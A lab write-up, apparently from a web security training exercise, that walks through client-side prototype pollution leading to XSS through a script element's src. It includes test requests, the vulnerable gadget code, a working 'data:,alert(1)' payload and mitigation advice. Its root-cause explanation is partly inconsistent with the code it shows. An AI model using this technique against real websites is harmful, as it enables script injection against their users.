# Lab: Client-side prototype pollution via browser APIs

## Description

This lab demonstrates how prototype pollution can lead to Cross-Site Scripting (XSS) by abusing browser APIs. The application reflects query parameters into a dynamically created `<script>` element. Because the script source is taken from an object property, an attacker can pollute `Object.prototype` to inject a malicious `src` value.

---

## Goal

Exploit client-side prototype pollution to execute arbitrary JavaScript in the victim's browser.

---

## Steps

### 1. Test if the prototype can be polluted

Send the following request:

```http
GET /?__proto__[foo]=bar HTTP/2
```

The application responds normally.

![Checking prototype pollution](checking-if-object-prototype-can-be-polluted.png)

---

### 2. Locate the vulnerable gadget

Open **Debugger → searchLoggerConfigurable.js**.

The vulnerable code is:

```javascript
let config = {
    params: deparam(new URL(location).searchParams.toString()),
    transport_url: false
};

Object.defineProperty(config, 'transport_url', {
    configurable: false,
    writable: false
});

if (config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```

Since `transport_url` is missing from the object, JavaScript looks up the prototype chain. If `Object.prototype.transport_url` exists, it is used.

![Missing property gadget](gadget-with-missing-value-feild-to-exploit.png)

---

### 3. Verify prototype pollution

Inject a prototype property:

```http
GET /?__proto__[value]=bar HTTP/2
```

Inspect the page.

A new script element is created:

```html
<script src="bar"></script>
```

This confirms prototype pollution successfully controls the `src` attribute.

![Modified request](modifying-request-to-check-parameters-end-up-in-script-tag.png)

![Injected script](bar-rendered-as-script.png)

---

### 4. Trigger JavaScript execution

Instead of a normal URL, use a `data:` URI:

```http
GET /?__proto__[value]=data:,alert(1); HTTP/2
```

The browser loads the generated script and executes:

```javascript
alert(1)
```

![Successful exploit](exploiting-to-generate-alert.png)

---

## Root Cause

The application creates a configuration object:

```javascript
let config = {
    params: deparam(...),
    transport_url: false
};
```

Later it checks:

```javascript
if (config.transport_url)
```

If `transport_url` is inherited from `Object.prototype`, the polluted value is trusted and assigned directly to:

```javascript
script.src = config.transport_url;
```

Using a `data:` URI allows arbitrary JavaScript execution.

---

## Payload

```text
/?__proto__[value]=data:,alert(1);
```

---

## Key Takeaways

- Browser APIs can become XSS gadgets when they consume inherited properties.
- Missing object properties may be resolved from `Object.prototype`.
- `data:` URLs can execute JavaScript when used as a script source.
- Always create configuration objects without prototypes or validate inherited properties.

---

## Mitigation

- Create objects using:

```javascript
Object.create(null)
```

- Check properties using:

```javascript
Object.hasOwn()
```

or

```javascript
hasOwnProperty()
```

- Reject special keys such as:

```
__proto__
prototype
constructor
```

during object parsing.

- Never use untrusted data directly as a script source.
